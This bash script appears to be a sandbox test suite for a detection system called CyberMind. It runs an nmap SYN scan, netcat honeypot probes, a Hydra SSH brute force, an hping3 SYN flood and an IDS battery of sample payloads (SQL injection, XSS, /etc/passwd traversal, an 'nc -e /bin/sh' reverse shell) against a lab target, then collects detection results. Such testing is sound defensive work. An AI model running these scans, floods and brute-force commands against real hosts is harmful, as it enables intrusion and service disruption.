#!/usr/bin/env bash
# ══════════════════════════════════════════════════════════════════════════════
# CyberMind Sandbox — Full Attack + Detection Suite
# Runs INSIDE the attacker container against flask on the lab network.
# ══════════════════════════════════════════════════════════════════════════════
set -uo pipefail

TARGET="${TARGET:-flask}"
OPS_API="${OPS_API:-http://flask:5000/api}"
RESULTS_DIR="${RESULTS_DIR:-/results}"
TS="$(date -u +%Y%m%dT%H%M%SZ)"
WORKDIR="$RESULTS_DIR/run_${TS}"
REPORT="$RESULTS_DIR/sandbox_report_${TS}.json"
LOG="$RESULTS_DIR/sandbox_run_${TS}.log"

mkdir -p "$WORKDIR"
exec > >(tee -a "$LOG") 2>&1

RED='\033[0;31m';GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

echo -e "${RED}╔══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${RED}║  CyberMind Docker Sandbox — Full Attack Suite                ║${NC}"
echo -e "${RED}║  Target: ${TARGET}                                           ║${NC}"
echo -e "${RED}╚══════════════════════════════════════════════════════════════╝${NC}"
echo ""

wait_for_api() {
  echo -e "${CYAN}[0] Waiting for CyberMind Ops API...${NC}"
  for _ in $(seq 1 60); do
    if curl -sf "$OPS_API/firewall/status" >/dev/null 2>&1 \
       || curl -sf "$OPS_API/stats" >/dev/null 2>&1 \
       || curl -sf "$OPS_API/honeypot/status" >/dev/null 2>&1; then
      echo -e "${GREEN}  ✔ API ready${NC}"
      return 0
    fi
    sleep 2
  done
  echo -e "${YELLOW}  ⚠ API not fully ready — continuing anyway${NC}"
}

post_json() {
  curl -sS -X POST "${OPS_API}$1" -H 'Content-Type: application/json' -d "$2" \
    || echo '{"success":false,"error":"request_failed"}'
}

get_json() {
  curl -sS "${OPS_API}$1" || echo '{"success":false,"error":"request_failed"}'
}

save() {
  # save <name> <json-string>
  printf '%s\n' "$2" > "$WORKDIR/$1.json"
}

wait_for_api

# ── 1. Start scan ────────────────────────────────────────────────────────────
echo -e "${CYAN}[1] Starting live scan job...${NC}"
SCAN_RESP=$(post_json "/scan/start" '{"packet_count":120}')
save scan_start "$SCAN_RESP"
echo "$SCAN_RESP" | jq . 2>/dev/null || echo "$SCAN_RESP"
JOB_ID=$(echo "$SCAN_RESP" | jq -r '.job_id // .data.job_id // empty' 2>/dev/null || true)
echo "  job_id=${JOB_ID:-unknown}"
sleep 2

# ── 2. Nmap ──────────────────────────────────────────────────────────────────
echo -e "${CYAN}[2] ATTACK 1/6 — Nmap SYN port scan → ${TARGET}${NC}"
nmap -sS -p 1-1000 --min-rate 300 "$TARGET" \
  -oN "$WORKDIR/nmap.txt" 2>&1 | tee "$WORKDIR/nmap_console.txt" || true
echo -e "${GREEN}  ✔ Port scan complete${NC}"
sleep 2

# ── 3. Honeypot probes ───────────────────────────────────────────────────────
echo -e "${CYAN}[3] ATTACK 2/6 — Honeypot probes${NC}"
for p in 2222 2323 8080 3390 2121 3307; do
  echo "  probing ${TARGET}:${p}"
  printf 'GET / HTTP/1.0\r\nHost: cybermind-lab\r\n\r\n' \
    | nc -w 2 "$TARGET" "$p" > "$WORKDIR/honeypot_${p}.txt" 2>&1 || true
done
echo -e "${GREEN}  ✔ Honeypot probes complete${NC}"
sleep 2

# ── 4. Hydra brute force ─────────────────────────────────────────────────────
echo -e "${CYAN}[4] ATTACK 3/6 — Hydra SSH brute → ${TARGET}:2222${NC}"
cat > /tmp/cm_wordlist.txt <<'EOF'
root
admin
password
123456
admin123
test
guest
cybermind
EOF
hydra -l admin -P /tmp/cm_wordlist.txt "ssh://${TARGET}:2222" -t 4 -f \
  -o "$WORKDIR/hydra.txt" 2>&1 | tee "$WORKDIR/hydra_console.txt" || true
rm -f /tmp/cm_wordlist.txt
echo -e "${GREEN}  ✔ Brute force complete${NC}"
sleep 2

# ── 5. SYN flood ─────────────────────────────────────────────────────────────
echo -e "${CYAN}[5] ATTACK 4/6 — hping3 SYN flood → ${TARGET}:8080 (8s)${NC}"
timeout 8 hping3 -S --flood -p 8080 "$TARGET" \
  > "$WORKDIR/hping3.txt" 2>&1 || true
echo -e "${GREEN}  ✔ SYN flood complete${NC}"
sleep 2

# ── 6. IDS signature battery ─────────────────────────────────────────────────
echo -e "${CYAN}[6] ATTACK 5/6 — IDS signature battery${NC}"
: > "$WORKDIR/ids_battery.ndjson"
while IFS= read -r payload; do
  [ -z "$payload" ] && continue
  body=$(python3 -c 'import json,sys; print(json.dumps({"text": sys.argv[1]}))' "$payload")
  resp=$(post_json "/analyze" "$body")
  echo "  → ${payload:0:55}"
  echo "$resp" | jq -c '{success, threat: (.data.threat_type // .threat_type // .label // .result // .message)}' 2>/dev/null || true
  python3 -c 'import json,sys; print(json.dumps({"payload":sys.argv[1],"response":json.loads(sys.argv[2])}))' \
    "$payload" "$resp" >> "$WORKDIR/ids_battery.ndjson"
done <<'PAYLOADS'
nmap -sS -p 1-1000 10.0.0.5
sqlmap -u http://target/?id=1 UNION SELECT
admin' OR '1'='1
hydra -l admin -P rockyou.txt ssh://10.0.0.5
<script>alert(1)</script>
../../etc/passwd
msfconsole reverse shell nc -e /bin/sh
lockbit ransomware cobalt strike beacon
syn flood ddos slowloris attack
mimikatz lsass credential dump
PAYLOADS
echo -e "${GREEN}  ✔ IDS battery complete${NC}"

# ── 7. Demo attack-sim ───────────────────────────────────────────────────────
echo -e "${CYAN}[7] ATTACK 6/6 — Demo attack-sim${NC}"
SIM_RESP=$(post_json "/demo/attack-sim" \
  '{"threat_type":"port_scan","tool":"nmap","target_port":8080,"payload":"sandbox nmap SYN","auto_block":false,"source_ip":"10.10.0.99"}')
save demo_attack_sim "$SIM_RESP"
echo "$SIM_RESP" | jq . 2>/dev/null || echo "$SIM_RESP"
echo -e "${GREEN}  ✔ Attack-sim complete${NC}"

# ── 8. Wait + collect ────────────────────────────────────────────────────────
echo -e "${CYAN}[8] Waiting for scan classification...${NC}"
sleep 8
if [[ -n "${JOB_ID:-}" ]]; then
  SCAN_STATUS=$(get_json "/scan/status/${JOB_ID}")
  save scan_status "$SCAN_STATUS"
  echo "$SCAN_STATUS" | jq . 2>/dev/null || echo "$SCAN_STATUS"
fi

echo -e "${CYAN}[9] Collecting CyberMind state...${NC}"
save honeypot_status "$(get_json /honeypot/status)"
save honeypot_logs "$(get_json /honeypot/logs)"
save honeypot_summary "$(get_json /honeypot/summary)"
save blacklist "$(get_json /blacklist/status)"
save firewall "$(get_json /firewall/status)"
save stats "$(get_json /stats)"
save latest_traffic "$(get_json /get_latest_traffic)"
save logs "$(get_json /logs)"
save ollama "$(get_json /ollama/status)"

# ── Assemble master report ───────────────────────────────────────────────────
python3 - <<'PY' "$WORKDIR" "$REPORT" "$TARGET" "$OPS_API" "$JOB_ID" "$LOG" "$TS"
import json, sys
from pathlib import Path
from datetime import datetime, timezone

workdir, report_path, target, ops_api, job_id, log_path, ts = sys.argv[1:8]
w = Path(workdir)

def load(name, default=None):
    p = w / f"{name}.json"
    if not p.exists():
        return default if default is not None else {}
    try:
        return json.loads(p.read_text())
    except Exception:
        return {"raw": p.read_text()[:2000]}

ids = []
nd = w / "ids_battery.ndjson"
if nd.exists():
    for line in nd.read_text().splitlines():
        if line.strip():
            try:
                ids.append(json.loads(line))
            except Exception:
                pass

report = {
    "generated_at": datetime.now(timezone.utc).isoformat(),
    "sandbox": "cybermind-lab",
    "target": target,
    "ops_api": ops_api,
    "run_dir": str(workdir),
    "scan": {
        "job_id": job_id or None,
        "start": load("scan_start"),
        "status": load("scan_status"),
    },
    "attacks_run": [
        "nmap_syn_port_scan",
        "honeypot_probes",
        "hydra_ssh_brute",
        "hping3_syn_flood",
        "ids_signature_battery",
        "demo_attack_sim",
    ],
    "ids_battery": ids,
    "demo_attack_sim": load("demo_attack_sim"),
    "cybermind_state": {
        "honeypot_status": load("honeypot_status"),
        "honeypot_logs": load("honeypot_logs"),
        "honeypot_summary": load("honeypot_summary"),
        "blacklist": load("blacklist"),
        "firewall": load("firewall"),
        "stats": load("stats"),
        "latest_traffic": load("latest_traffic"),
        "logs": load("logs"),
        "ollama": load("ollama"),
    },
    "artifacts": {
        "log": log_path,
        "workdir": str(workdir),
        "timestamp": ts,
    },
}

Path(report_path).write_text(json.dumps(report, indent=2))
print(f"Wrote {report_path}")

# Pass / fail summary
hp = report["cybermind_state"]["honeypot_logs"]
ids_hits = sum(1 for i in ids if i.get("response"))
print(f"IDS analyze calls: {ids_hits}")
print(f"Honeypot logs keys: {list(hp.keys()) if isinstance(hp, dict) else type(hp)}")
PY

echo ""
echo -e "${GREEN}╔══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║  ALL ATTACKS COMPLETE                                        ║${NC}"
echo -e "${GREEN}║  Report: ${REPORT}${NC}"
echo -e "${GREEN}║  Log:    ${LOG}${NC}"
echo -e "${GREEN}╚══════════════════════════════════════════════════════════════╝${NC}"
